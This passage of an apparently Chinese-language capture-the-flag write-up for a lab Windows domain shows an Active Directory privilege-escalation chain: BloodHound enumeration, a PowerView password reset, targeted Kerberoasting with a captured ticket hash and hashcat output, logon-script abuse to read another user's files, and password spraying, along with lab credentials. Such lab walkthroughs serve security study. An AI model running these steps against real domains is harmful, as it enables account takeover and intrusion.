</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.6087369-07:00|INFORMATION|Initializing SharpHound at 1:33 AM on 9/15/2025
</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.6556142-07:00|INFORMATION|Resolved current domain to object.local
</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.7962370-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
</span></span><span style="display:flex;"><span>2025-09-15T01:33:51.9212379-07:00|INFORMATION|Beginning LDAP search <span style="color:#66d9ef">for</span> object.local
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.0149945-07:00|INFORMATION|Beginning LDAP search <span style="color:#66d9ef">for</span> object.local Configuration NC
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.0306166-07:00|INFORMATION|Producer has finished, closing LDAP channel
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.0306166-07:00|INFORMATION|LDAP channel closed, waiting <span style="color:#66d9ef">for</span> consumers
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.0618605-07:00|INFORMATION|<span style="color:#f92672">[</span>CommonLib ACLProc<span style="color:#f92672">]</span>Building GUID Cache <span style="color:#66d9ef">for</span> OBJECT.LOCAL
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.0618605-07:00|INFORMATION|<span style="color:#f92672">[</span>CommonLib ACLProc<span style="color:#f92672">]</span>Building GUID Cache <span style="color:#66d9ef">for</span> OBJECT.LOCAL
</span></span><span style="display:flex;"><span>2025-09-15T01:33:52.2806096-07:00|INFORMATION|<span style="color:#f92672">[</span>CommonLib ACLProc<span style="color:#f92672">]</span>Building GUID Cache <span style="color:#66d9ef">for</span> OBJECT.LOCAL
</span></span><span style="display:flex;"><span>2025-09-15T01:33:57.9368556-07:00|INFORMATION|Consumers finished, closing output channel
</span></span><span style="display:flex;"><span>Closing writers
</span></span><span style="display:flex;"><span>2025-09-15T01:33:57.9681108-07:00|INFORMATION|Output channel closed, waiting <span style="color:#66d9ef">for</span> output task to complete
</span></span><span style="display:flex;"><span>2025-09-15T01:33:58.1087385-07:00|INFORMATION|Status: <span style="color:#ae81ff">295</span> objects finished <span style="color:#f92672">(</span>+295 49.16667<span style="color:#f92672">)</span>/s -- Using <span style="color:#ae81ff">38</span> MB RAM
</span></span><span style="display:flex;"><span>2025-09-15T01:33:58.1087385-07:00|INFORMATION|Enumeration finished in 00:00:06.2117993
</span></span><span style="display:flex;"><span>2025-09-15T01:33:58.2024948-07:00|INFORMATION|Saving cache with stats: <span style="color:#ae81ff">17</span> ID to type mappings.
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span> name to SID mappings.
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span> machine sid mappings.
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span> sid to domain mappings.
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span> global catalog mappings.
</span></span><span style="display:flex;"><span>2025-09-15T01:33:58.2337554-07:00|INFORMATION|SharpHound Enumeration Completed at 1:33 AM on 9/15/2025! Happy Graphing!
</span></span></code></pre></div><p>oliver对smith有修改密码的权限</p>
<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-4.4jogoit2yr.webp" alt="image.png"></p>
<p>导入 <code>PowerView.ps1</code> ,本地修改</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;c1cdfun_d2434&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;object.local\oliver&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$UserPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;Password123!&#39;</span> -AsPlainText -Force
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Set-DomainUserPassword -Identity SMITH -AccountPassword $UserPassword -Credential $Cred
</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-5.5fky3z2rer.webp" alt="image.png"></p>
<p>因为SMITH为远程管理组，可以用winrm端口验证密码是否更改</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc winrm <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u $user -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:JENKINS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:object.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> object.local<span style="color:#ae81ff">\S</span>MITH:Password123! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>smith对maria有通用写入的权限</p>
<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-6.96a3p7rmmc.webp" alt="image.png"></p>
<p>打Kerberoast 攻击</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;Password123!&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;object.local\SMITH&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Set-DomainObject -Credential $Cred -Identity MARIA -SET @<span style="color:#f92672">{</span>serviceprincipalname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nonexistent/BLAHBLAH&#39;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-DomainSPNTicket -Credential $Cred <span style="color:#e6db74">&#39;nonexistent/BLAHBLAH&#39;</span> | fl
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>liver<span style="color:#ae81ff">\D</span>esktop&gt; Get-DomainSPNTicket -Credential $Cred <span style="color:#e6db74">&#39;nonexistent/BLAHBLAH&#39;</span> | fl
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>Warning: <span style="color:#f92672">[</span>Invoke-UserImpersonation<span style="color:#f92672">]</span> powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
</span></span><span style="display:flex;"><span>Warning: <span style="color:#f92672">[</span>Invoke-UserImpersonation<span style="color:#f92672">]</span> Executing LogonUser<span style="color:#f92672">()</span> with user: object.local<span style="color:#ae81ff">\S</span>MITH
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SamAccountName       : UNKNOWN
</span></span><span style="display:flex;"><span>DistinguishedName    : UNKNOWN
</span></span><span style="display:flex;"><span>ServicePrincipalName : nonexistent/BLAHBLAH
</span></span><span style="display:flex;"><span>TicketByteHexStream  :
</span></span><span style="display:flex;"><span>Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$64E15795FB3425481EDEE2D420EEACD7$A1F55CC80AF03C4E5AAD592752AF35BA90EB00ECFCF916E6D1C2688DA47C8667F3B0D69A4C724743E2D4C7CC0999560933A0DE554334F0557CFBD53533A7B8B1194B31F8020A38
</span></span><span style="display:flex;"><span>                       34F35F5B7B19683243113140CA26D0B9924DA449BBDEB7451431AB200CC115F4E92A1BECE52B653EEE7D534050531683D3B8D211E50BEFDFBDCB9D67849F4F387099CED7B94807C180C7D374FD309F5C631A8C2FA3711A9CFF619FA0AB9D7C75CEAD0679596CCA11A8477C196F4DFFD5B6
</span></span><span style="display:flex;"><span>                       451E7EE0DBA58174DF12396873358EA6F64422BCF68AB3D7F35759AB4CE85C6B544D5A0A42235FC2D78245F0B3EF1606FDF4F79AA7C539CF4DF5D9192238B8B6CEEBBA66E2F4684A751B7191DE80B819BE45CE926BFA0C71A9BCE98882C01A2CDD0B4C17B4000D0DF9E2AA7EDD4AB73B1C
</span></span><span style="display:flex;"><span>                       5E16ACAB633F45F1FF06893A49082CB33CFCA0332E2858062806E3DAC06AB64DFFC0B74DBC9A3A43098F143FCA0E699037FF95F1A610252DA5C94F13116514FCC772A326365D4D168C0612750DD0DA4D5A63EB757351F8DD44E240BC4A7DB49E236A3028FA79F25EC5587350C1CBDB02C2
</span></span><span style="display:flex;"><span>                       CF6334CDF5F554F89B6B5111E7A712B213BA455AD5619783B233BE151A49A8F119423038F4E4A3233C414D6D1C222064FF34FDB4224EE55B7702DE7FC5444AB87F59B44588D4C6E52D72809FEDFDF351C062655C4B304E44C79940BEAC2F38CD01B455E9599312D2E69AF0FE947F3ABC45
</span></span><span style="display:flex;"><span>                       3BF76DC1E90EABB693B0F2191623B7206D47968F51B698375E60F3A821E57228622D9AF56162D65A0BDB668A3ACD1598CE1F22CF579C55AA0CA064615C91D01959C744C261E45623FBA39CE337893607638D8F9B4CF48E048EBD01070967F324D1C54D42E63156DC38A268F45036914C11
</span></span><span style="display:flex;"><span>                       890AEDBD540FA028C4ADA07834EE556F380E3BC3AC27D1FBD34AC1E85711F2EC0DB4653993E6A0EE71D22DE2C89DFFEC3BC77FB44A9BA00C1AC73094348A7E0303F60B506DA02FD58AC8ABDA549941B57E06549A8DBD12C583E1A02DE1592BAE2C986824E5BDBFAC14F7E154BFF5A3FB68
</span></span><span style="display:flex;"><span>                       531C2A2BD2082FE3D77EAE863CE40A35B4F90E310CCDBC44E8CEF51266A8F4A9904275FEE55C23DA463856DB0E92ACBECED3BFF772FAA7D6CDC7F0807817D49D1E92DBE03773B84B8D787EED68A9CE2794AA077CBBC256A73F82CF2805D57DCEA104D6BE19529607F77FFE4775BF31CF8B
</span></span><span style="display:flex;"><span>                       08A929EC25510A6E272593C675ADA79A5C6F1FF36375EFAA9AD16E40F67712F914F96BFCC9BEC7F692A461A87CBA4F080926288C59B70FAF5EC8148FE262B1405D70E155AA5189A7BA58B42EFA3C0C1110969E970CEC0E30484D9577A4A2754343BCEAB0933DA77F8F2FEC480077EF8881
</span></span><span style="display:flex;"><span>                       0BD41ACAFD86F7D697047FB84E5089CFF0072039F6CF5188A63F260E9FD0ECC6DABE013692F43F6E8B3E13DBBDBC08407F8AD4C4C8486C187AB9DCB362C13EC9E974A80CC7C94CB479940BBC4703D932A40CF4A09B00A03267A0CC119A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Warning: <span style="color:#f92672">[</span>Invoke-RevertToSelf<span style="color:#f92672">]</span> Reverting token impersonation and closing LogonUser<span style="color:#f92672">()</span> token handle
</span></span></code></pre></div><p>没有爆破出来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat  -a <span style="color:#ae81ff">0</span>  hash /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>
</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700H, 6846/13757 MB (2048 MB allocatable), 20MCU</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
</span></span><span style="display:flex;"><span>The following mode was auto-detected as the only one matching your input hash:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13100</span> | Kerberos 5, etype 23, TGS-REP | Network Protocol
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
</span></span><span style="display:flex;"><span>Do NOT report auto-detect issues unless you are certain of the hash type.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Optimizers applied:
</span></span><span style="display:flex;"><span>* Zero-Byte
</span></span><span style="display:flex;"><span>* Not-Iterated
</span></span><span style="display:flex;"><span>* Single-Hash
</span></span><span style="display:flex;"><span>* Single-Salt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">5</span> MB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dictionary cache hit:
</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.           
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Session..........: hashcat                                
</span></span><span style="display:flex;"><span>Status...........: Exhausted
</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Hash.Target......: $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$...cc119a
</span></span><span style="display:flex;"><span>Time.Started.....: Tue Sep <span style="color:#ae81ff">16</span> 01:07:55 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Sep <span style="color:#ae81ff">16</span> 01:07:58 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Speed.#1.........:  4620.7 kH/s <span style="color:#f92672">(</span>2.03ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
</span></span><span style="display:flex;"><span>Recovered........: 0/1 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 0/1 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Progress.........: 14344385/14344385 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Rejected.........: 0/14344385 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Point....: 14344385/14344385 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
</span></span><span style="display:flex;"><span>Candidates.#1....: $HEX<span style="color:#f92672">[</span>2321686f74746965<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 46%
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Started: Tue Sep <span style="color:#ae81ff">16</span> 01:07:53 <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>Stopped: Tue Sep <span style="color:#ae81ff">16</span> 01:08:00 <span style="color:#ae81ff">2025</span>
</span></span></code></pre></div><p><strong><code>GenericWrite</code> 可以</strong>更改目标的启动脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;dir C:\users\maria\ &gt; C:\ProgramData\1.txt&#34;</span> &gt; 1.ps1
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Set-DomainObject -Identity maria -SET @<span style="color:#f92672">{</span>scriptpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\ProgramData\\1.ps1&#34;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogramData&gt; cat 1.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>aria
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                3D Objects
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Contacts
</span></span><span style="display:flex;"><span>d-r---       10/25/2021   3:47 AM                Desktop
</span></span><span style="display:flex;"><span>d-r---       10/25/2021  10:07 PM                Documents
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Downloads
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Favorites
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Links
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Music
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Pictures
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Saved Games
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Searches
</span></span><span style="display:flex;"><span>d-r---       10/22/2021   3:54 AM                Videos
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;dir C:\users\maria\Desktop &gt; C:\ProgramData\1.txt&#34;</span> &gt; 1.ps1
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogramData&gt; cat 1.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>aria<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>-a----       10/26/2021   8:13 AM           <span style="color:#ae81ff">6144</span> Engines.xls
</span></span></code></pre></div><p>将目标桌面的 <code>Engines.xls</code>  复制到 <code>C:\ProgramData</code> 下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogramData&gt; echo <span style="color:#e6db74">&#34;Copy-Item -Path &#39;C:\Users\maria\Desktop\Engines.xls&#39; -Destination &#39;C:\ProgramData\&#39; -Force -ErrorAction Stop&#34;</span> &gt; 1.ps1
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogramData&gt; ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\P</span>rogramData
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                -------------         ------ ----
</span></span><span style="display:flex;"><span>d---s-       10/21/2021   3:13 AM                Microsoft
</span></span><span style="display:flex;"><span>d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
</span></span><span style="display:flex;"><span>d-----        9/15/2018  12:19 AM                SoftwareDistribution
</span></span><span style="display:flex;"><span>d-----        4/10/2020   5:48 AM                ssh
</span></span><span style="display:flex;"><span>d-----        4/10/2020  10:49 AM                USOPrivate
</span></span><span style="display:flex;"><span>d-----        4/10/2020  10:49 AM                USOShared
</span></span><span style="display:flex;"><span>d-----        8/25/2021   2:57 AM                VMware
</span></span><span style="display:flex;"><span>-a----        9/15/2025   2:49 AM            <span style="color:#ae81ff">222</span> 1.ps1
</span></span><span style="display:flex;"><span>-a----        9/15/2025   2:49 AM            <span style="color:#ae81ff">830</span> 1.txt
</span></span><span style="display:flex;"><span>-a----        9/15/2025   2:47 AM              <span style="color:#ae81ff">0</span> 2.txt
</span></span><span style="display:flex;"><span>-a----       10/26/2021   8:13 AM           <span style="color:#ae81ff">6144</span> Engines.xls
</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-7.3d55fx46dh.webp" alt="image.png"></p>
<p>密码喷洒下，发现 <code>maria:W3llcr4ft3d_4cls</code> 可以登入</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc winrm <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u $user -p pass
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:JENKINS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:object.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> object.local<span style="color:#ae81ff">\m</span>aria:d34gb8@
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> object.local<span style="color:#ae81ff">\m</span>aria:0de_434_d545
</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>WINRM       10.10.11.132    <span style="color:#ae81ff">5985</span>   JENKINS          <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> object.local<span style="color:#ae81ff">\m</span>aria:W3llcr4ft3d_4cls <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-8.8ok20mq91i.webp" alt="image.png"></p>
<p>创建一个 PSCredential 对象</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$SecPassword <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;W3llcr4ft3d_4cls&#39;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$Cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;object.local\maria&#39;</span>, $SecPassword<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>将 maria 指定为该组的所有者</p>
